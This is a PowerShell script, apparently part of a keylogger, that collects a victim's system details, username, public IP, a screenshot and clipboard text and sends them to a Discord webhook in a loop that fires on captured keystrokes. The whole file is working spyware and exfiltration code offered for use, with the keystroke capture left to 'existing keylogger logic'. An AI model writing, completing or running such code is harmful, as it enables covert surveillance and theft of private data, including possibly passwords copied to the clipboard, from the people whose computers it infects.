# Function to get system information
function Get-SystemInfo {
    $sysinfo = @{
        "OS" = [System.Environment]::OSVersion.VersionString
        "Architecture" = if ([System.Environment]::Is64BitOperatingSystem) { "64-bit" } else { "32-bit" }
        "MachineName" = [System.Environment]::MachineName
        "UserName" = [System.Environment]::UserName
        "CPU" = (Get-WmiObject -Class Win32_Processor).Name
        "RAM" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    }
    return $sysinfo
}

# Function to get the public IP address
function Get-PublicIP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
        return $response.ip
    } catch {
        return "Unable to retrieve IP"
    }
}

# Function to capture a screenshot
function Capture-Screenshot {
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
    return $stream.ToArray()
}

# Function to get clipboard content
function Get-ClipboardContent {
    Add-Type -AssemblyName System.Windows.Forms
    return [System.Windows.Forms.Clipboard]::GetText()
}

# Function to send data to Discord webhook
function Send-DiscordWebhook {
    $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
    $systemInfo = Get-SystemInfo
    $publicIP = Get-PublicIP
    $screenshotBytes = Capture-Screenshot
    $screenshotBase64 = [Convert]::ToBase64String($screenshotBytes)
    $clipboardContent = Get-ClipboardContent

    $content = @"
**KL Started.**

**PC Information**
`OS:` $($systemInfo['OS'])
`Architecture:` $($systemInfo['Architecture'])
`Machine Name:` $($systemInfo['MachineName'])
`User Name:` $($systemInfo['UserName'])
`CPU:` $($systemInfo['CPU'])
`RAM:` $($systemInfo['RAM']) GB

**Public IP:** $publicIP

**Clipboard Content:**
$clipboardContent
"@

    $jsonsys = @{
        "username" = "$env:COMPUTERNAME"
        "content" = $content
        "screenshot" = $screenshotBase64
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
}

# Main loop for keypress detection (this should be integrated with your existing keylogger logic)
While ($true) {
    # Assuming $send contains the keystrokes captured
    if ($send -or $clipboardContent) {
        Send-DiscordWebhook
        $send = ""
    }
    Start-Sleep -Milliseconds 100
}
